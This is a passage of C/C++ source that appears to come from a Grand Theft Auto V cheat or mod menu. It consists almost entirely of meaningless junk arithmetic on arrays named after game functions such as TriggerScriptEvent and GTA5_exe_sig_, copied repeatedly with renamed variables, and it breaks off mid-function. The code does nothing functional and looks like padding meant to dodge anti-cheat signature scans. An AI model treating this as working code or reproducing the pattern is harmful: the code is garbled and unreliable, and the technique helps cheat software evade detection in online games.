				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<VehicleProperties>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
